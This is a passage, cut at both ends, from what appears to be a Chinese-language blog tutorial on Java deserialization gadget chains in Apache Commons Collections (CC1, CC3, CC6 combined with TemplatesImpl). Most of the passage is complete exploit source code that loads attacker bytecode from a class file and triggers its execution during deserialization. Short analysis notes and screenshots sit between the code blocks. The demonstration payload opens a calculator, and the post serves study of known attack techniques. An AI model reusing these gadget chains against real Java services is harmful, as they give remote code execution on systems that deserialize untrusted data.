<span class="operator">=</span> templates.getClass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">    nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    nameField.set(templates, <span class="string">&quot;p0l1st&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">    bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;E://Calc.class&quot;</span>));</span><br><span class="line">    <span class="type">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">    bytecodesField.set(templates, codes);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">    tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">    <span class="comment">//     templates.newTransformer();</span></span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates), <span class="comment">// 构造 setValue 的可控参数</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">    HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()</span><br><span class="line">            , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);</span><br><span class="line">    invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);</span><br><span class="line"></span><br><span class="line">    serialize(invocationHandler);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">            oos.writeObject(obj);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438602.png"></p><h1 id="CC6-TemplatesImpl"><a href="#CC6-TemplatesImpl" class="headerlink" title="CC6+TemplatesImpl"></a>CC6+TemplatesImpl</h1><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6TemplatesExp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">    nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    nameField.set(templates, <span class="string">&quot;p0l1st&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">    bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;E://Calc.class&quot;</span>));</span><br><span class="line">    <span class="type">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">    bytecodesField.set(templates, codes);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">    tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">    <span class="comment">//     templates.newTransformer();</span></span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">    HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;five&quot;</span>)); <span class="comment">// 防止在反序列化前弹计算器</span></span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;key&quot;</span>);</span><br><span class="line">    HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    expMap.put(tiedMapEntry, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">    lazyMap.remove(<span class="string">&quot;key&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在 put 之后通过反射修改值</span></span><br><span class="line">    Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">    factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    factoryField.set(lazyMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">    serialize(expMap);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">            oos.writeObject(obj);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438689.png" alt="image-20250121194757050"></p><h1 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h1><h2 id="继续分析"><a href="#继续分析" class="headerlink" title="继续分析"></a>继续分析</h2><p>因为只需要调用<code>TemplatesImpl</code>类的<code>newTransformer()</code>方法就可以命令执行，我们继续到<code>newTransformer()</code>方法下，find usages</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438936.png" alt="image-20250122123551888"></p><p>找到了一个合适的类<code>TrAXFilter</code></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438762.png" alt="image-20250122124007188"></p><p>它不能序列化，但是构造函数有条语句，我们可以通过执行构造函数来命令执行</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_transformer = (TransformerImpl) templates.newTransformer();</span><br></pre></td></tr></table></figure></div><p>CC3的作者调用了一个新的类<code>InstantiateTransformer</code>,这个类是用来初始化<code>Transformer</code>的，我们去找<code>InstantiateTransformer</code>类下的<code>transform</code>方法</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438036.png" alt="image-20250122124716799"></p><p>只要<code>Class</code>不为空就会获取其指定参数构造器并调用构造函数</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3ExpFinal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IllegalAccessException, TransformerConfigurationException, NoSuchFieldException, IOException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;p0l1st&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;E://Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        instantiateTransformer.transform(TrAXFilter.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438253.png" alt="image-20250122130429003"></p><p>补一下流程图</p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438642.png" alt="image-20250122131638641" style="zoom: 50%;"><p>然后就是找入口类的前半部分，从谁调用了<code>transform</code>开始，那么就可以结合CC1和CC6</p><h3 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3ExpFinal1</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">    nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    nameField.set(templates,<span class="string">&quot;p0l1st&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">    bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;E://Calc.class&quot;</span>));</span><br><span class="line">    <span class="type">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">    bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">    tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">    <span class="comment">//    templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">    <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class), <span class="comment">// 构造 setValue 的可控参数</span></span><br><span class="line">            instantiateTransformer</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">    HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()</span><br><span class="line">            , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);</span><br><span class="line"></span><br><span class="line">    serialize(o);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">            oos.writeObject(obj);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202501221438016.png" alt="image-20250122132431536"></p><h3 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 